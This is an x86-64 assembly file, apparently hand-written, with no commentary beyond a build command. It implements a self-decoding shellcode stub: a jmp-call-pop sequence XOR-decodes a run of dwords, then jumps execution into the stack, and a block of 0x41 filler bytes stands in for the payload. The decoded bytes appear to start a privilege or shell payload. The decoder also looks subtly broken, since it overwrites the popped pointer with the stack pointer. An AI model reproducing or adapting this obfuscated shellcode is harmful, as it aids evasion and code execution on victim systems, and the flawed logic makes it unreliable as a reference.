	.global _start
	.text
_start:
	push %rbp
    mov %rsp, %rbp
    sub $0x200, %rsp
    jmp trois
un:
	pop %rsi
	mov %rsp, %rsi
deux:
	xorl $0x7009282b, (%rsi)
	add $4, %rsi
	xorl $0xbe7009b7, (%rsi)
	add $4, %rsi
	xorl $0xb3c80919, (%rsi)
	add $4, %rsi
	xorl $0x7a2b444e, (%rsi)
	add $4, %rsi
	xorl $0xb7700919, (%rsi)
	add $4, %rsi
	xorl $0x13b3c809, (%rsi)
	add $4, %rsi
	xorl $0x316c2927, (%rsi)
	add $4, %rsi
	xorl $0x09292b27, (%rsi)
	add $4, %rsi
	xorl $0x28236efa, (%rsi)
	add $4, %rsi
	xorl $0x20236e2f, (%rsi)
	add $4, %rsi
	xorl $0x1e151232, (%rsi)
	add $4, %rsi
	xorl $0x7009444e, (%rsi)
	add $4, %rsi
	xorl $0x81c20981, (%rsi)
	add $4, %rsi
	xorl $0xbe70097d, (%rsi)
	add $4, %rsi
	xorb $0x4e, (%rsi)
	inc %rsi
	xorb $0x44, (%rsi)
	jmp *%rsp
trois:
	call un
quatre:
	.byte 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41


/*
as ress.s -o ress.o && ld ress.o -o ress
*/